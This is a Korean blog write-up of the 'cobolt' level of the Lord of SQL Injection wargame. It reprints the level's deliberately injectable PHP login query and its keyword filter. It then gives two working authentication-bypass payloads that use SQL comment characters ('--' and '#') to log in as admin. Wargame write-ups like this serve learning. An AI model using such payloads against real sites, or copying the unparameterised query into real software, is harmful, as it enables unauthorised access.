---
title: "[Lord of SQL Injection] LoS - cobolt 문제풀이"
date: 2018-07-21
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

두 번째 문제는 `cobolt`이다.
모든 문제의 이름이 괴물(?) 몬스터(?)의 이름인 것 같다.  

<!--more-->

코드는 다음과 같다.  

```php
----------------------------------------------------------------------------------
query : select id from prob_cobolt where id='' and pw=md5('')
----------------------------------------------------------------------------------

<?php
  include "./config.php"; 
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

이번에는 `pw`를 쿼리에 넣을 때 `md5`로 해싱을 한다.
때문에 이 전 문제처럼 pw에 인젝션을 해 문제를 풀 수 없다.
문제를 풀기위한 조건도 좀 달라졌다.  

```php
if($result['id'] == 'admin') solve("cobolt");
```

즉, 쿼리 결과로 나온 `id`가 `admin`이어야 문제를 풀 수 있다.
어떻게 할 지 고민하다가 `pw` 검증 루틴을 아예 무시하도록 하는 방법을 사용했다.
나는 주석을 사용했는데, 주석은 `#`이나 `--`를 사용한다.
이 때, `--`를 사용할 때는 뒤에 꼭 공백이 있어야 한다.
따라서 다음과 같은 두 가지 방법으로 문제를 풀 수 있다.  

```plain
1. ?id=admin'--%20
2. ?id=admin'%23
```

공백과 #은 `URL Encoding`을 해서 넘겨주어야 한다.
역시 이번에도 문제가 풀렸다.  

```php
--------------------------------------------------------------------------------------------
query : select id from prob_cobolt where id='admin'#' and pw=md5('')
--------------------------------------------------------------------------------------------

COBOLT Clear!
<?php
  include "./config.php"; 
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

---

```plain
COBOLT Clear!!
```